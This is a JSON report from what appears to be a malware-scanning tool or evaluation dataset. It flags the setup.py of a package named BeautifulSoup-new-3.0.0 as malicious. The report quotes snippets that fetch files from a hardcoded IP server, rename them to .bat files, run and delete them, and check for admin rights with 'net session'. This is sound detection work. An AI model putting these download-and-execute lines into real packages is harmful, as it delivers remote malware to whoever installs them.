{
  "package_name": "BeautifulSoup-new-3.0.0",
  "total_matches": 10,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 10,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "The code contains several clear indicators of malicious behavior. In the section gated by if os.name == 'nt', the script downloads files from a suspicious remote server (http://52.14.229.35:1122/connect-CANDC.txt and http://52.14.229.35:1122/shoomsha.jpg), saves them locally, renames them to .bat files, and then executes them using subprocess.Popen. This is a classic pattern for downloading and executing remote code, which can be used to deliver malware or establish a remote control channel (C2/C&C). The code also attempts to escalate privileges by checking for administrative access (via 'net session'), and prompts the user to reinstall with administrative permissions if not present. The use of obfuscated file names, execution of downloaded content, and attempts to clean up (delete) the batch files further indicate an attempt to evade detection and persist on the system. This is not normal or legitimate behavior for a setup.py or any package installation script.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "185",
          "type_description": "shady-links: found 2 source code matches",
          "code_snippet": "remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at BeautifulSoup-new-3.0.0/setup.py:185",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "209",
          "type_description": "shady-links: found 2 source code matches",
          "code_snippet": "remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at BeautifulSoup-new-3.0.0/setup.py:209",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "173",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\nstderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:173",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "191",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:191",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "197",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:197",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "200",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\nstdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:200",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "204",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:204",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "215",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\nstdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:215",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "217",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\nstderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:217",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        },
        {
          "line_number": "221",
          "type_description": "code-execution: found 8 source code matches",
          "code_snippet": "subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\nstdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at BeautifulSoup-new-3.0.0/setup.py:221",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/BeautifulSoup-new-3.0.0/BeautifulSoup-new-3.0.0/setup.py",
          "relative_path": "BeautifulSoup-new-3.0.0/setup.py"
        }
      ]
    }
  ]
}